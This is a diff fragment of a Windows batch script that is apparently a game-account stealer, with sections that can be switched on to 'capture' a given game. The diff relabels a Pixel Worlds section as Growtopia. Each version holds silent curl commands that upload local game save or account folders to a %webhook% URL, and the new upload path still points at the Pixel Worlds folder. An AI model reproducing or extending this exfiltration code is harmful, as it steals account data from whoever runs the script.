@@ -234,14 +234,14 @@ goto skipminecraft
 	timeout /t 2 /nobreak > NUL
 :skipminecraft
 
-:: PIXELWORLDS - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
-goto skippixelworlds
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- PIXELWORLDS -```\"}"  %webhook%
-	curl --silent --output /dev/null -F Kukouri=@"C:\Users\Kasutaja\AppData\LocalLow\Kukouri" %webhook%
+goto skipgrowtopia
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
+	curl --silent --output /dev/null -F save.dat=@"Program Files\SteamLibrary\steamapps\common\Pixel Worlds" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:pixelworlds
+:skipgrowtopia
 
 :: OTHER
 :: -----
